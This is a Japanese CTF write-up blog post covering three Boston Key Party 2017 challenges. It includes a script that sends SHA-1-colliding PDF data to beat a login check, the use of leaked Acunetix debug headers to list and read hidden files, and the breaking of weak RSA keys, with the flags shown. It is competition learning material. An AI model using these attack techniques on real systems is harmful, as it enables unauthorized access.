---
layout: post
title: Boston Key Party CTF 2017 の write-up
categories: [ctf]
date: 2017-02-28 12:00:00 +0900
---

チーム Harekaze で [Boston Key Party CTF 2017](http://bostonkeyparty.net/) に参加しました。最終的にチームで 301 点を獲得し、順位は 135 位 (得点 948 チーム中) でした。うち、私は 3 問を解いて 300 点を入れました。

以下、解いた問題の write-up です。

## [cloud 50] Prudentialv2

`$name == $password` かつ `sha1($name) === sha1($password)` な文字列を見つけろという問題でした。[http://shattered.it/](http://shattered.it/)。

```python
import requests
import urllib

url = 'http://54.202.82.13/?name={}&password={}'.format(
  urllib.quote(open('shattered-1.pdf', 'rb').read()[:1000]),
  urllib.quote(open('shattered-2.pdf', 'rb').read()[:1000])
)
print requests.get(url).content
```

```
AfterThursdayWeHadToReduceThePointValue
```

## [cloud 100] Wackusensor

与えられたソースを読んでいると `$_SERVER['HTTP_ACUNETIX_ASPECT_PASSWORD']` を読んでいる箇所があります。ググってみると [SQL Injection and XSS vulnerabilities in CubeCart version 4.3.3](http://www.acunetix.com/blog/articles/sql-injection-xss-cubecart-4-3-3/) という記事がヒットしました。

パスワードが `bkp2017` ということなので `Acunetix-Aspect-Password: 4faa9d4408780ae071ca2708e3f09449`、`Acunetix-Aspect: enabled` を付与して `/` にアクセスすると

```
00000010PHP_File_Includes0000003Csuper_secret_file_containing_the_flag_you_should_read_it.php00000017/var/www/html/index.php0000000Fs00000015"include" was called.0000000AVar_Accessa0000000200000003GET00000001s00000017/var/www/html/index.php00000012n0000000AVar_Accessa0000000200000003GET0000001Dsuper_secret_parameter_hahaha00000017/var/www/html/index.php00000014n
```

というような文字列が Base64 エンコードされて出力されました。`/super_secret_file_containing_the_flag_you_should_read_it.php` を見てみると、

```
It seems that this machine is executing the php code instead of displaying it,
you'll have to find another way :o)
```

とあり、どうやらこのソースを見る必要があるようです。`Acunetix-Aspect-Queries: filelist` を付与してアクセスすると

```
00000004PANGn0000000000000000n00000009File_Lista0000000800000016super_secret_temp_dir/0000003Dsuper_secret_temp_dir/_AAS16700684323dcb105cae71d0057151d9e1c0000003Dsuper_secret_temp_dir/_AAS167a8756efa1c65a6374f139ccab28d68e40000000Bfavicon.png0000003Csuper_secret_file_containing_the_flag_you_should_read_it.php00000009index.php00000011acu_phpaspect.txt00000009style.css0000004A/var/www/html/super_secret_file_containing_the_flag_you_should_read_it.php00000000n
```

という文字列が Base64 エンコードされて出力されました。`/super_secret_temp_dir/_AAS16700684323dcb105cae71d0057151d9e1c` にアクセスするとフラグが表示されました。

```
BKP{What_about_writing_a_Burp_extension_for_this_N0w?}
```

## [crypto 150] RSA Buffet

10 個の公開鍵と 5 個の暗号文が与えられるので、なんとかして復号しろという問題でした。

私が問題を見た時点で、[@jtwp470](https://twitter.com/jtwp470) さんが key-3.pem の秘密鍵を作って ciphertext-4.bin を復号されていました。どうやら与えられた公開鍵は脆弱なものばかりなようです。

key-0.pem と key-6.pem は gcd を取ってみると共通の素因数を持つことが分かりました。

key-1.pem は Fermat 法で素因数分解できました。

key-2.pem は [factordb.com](http://www.factordb.com/) に素因数分解の結果が載っていました。

ciphertext-1.bin は key-2.pem の秘密鍵で、ciphertext-3.bin は key-0.pem の秘密鍵で、ciphertext-5.bin は key-1.pem の秘密鍵で復号できました。あとは

```python
from secretsharing import PlaintextToHexSecretSharer as SS
print SS.recover_secret(['1-e0c113fa1ebea9318dd413bf28308707fd660a5d1417fbc7da72416c8baaa5bf628f11c660dcee518134353e6ff8d37c', '3-b69efb4f9c5205175a4c9afb9d3c7bef728d9fb6c9cc1241411b31d4bd18744660391a330cefa8a86af8d2b80c881cfa', '5-a7a1e271cf263279cece532b540545fa539b0f3650e2929163b02ee5459debdc53c1e07149eb2153015bb5c88e6270e8'])
```

で

```
Three's the magic number!  FLAG{ndQzjRpnSP60NgWET6jX}
```

と出力されました。

```
FLAG{ndQzjRpnSP60NgWET6jX}
```

## 感想

- [cloud 200] Artisinal Shoutboxes
- [cloud 250] Accelerated.zone

は解きたかったのですが解けませんでした。くやしい。
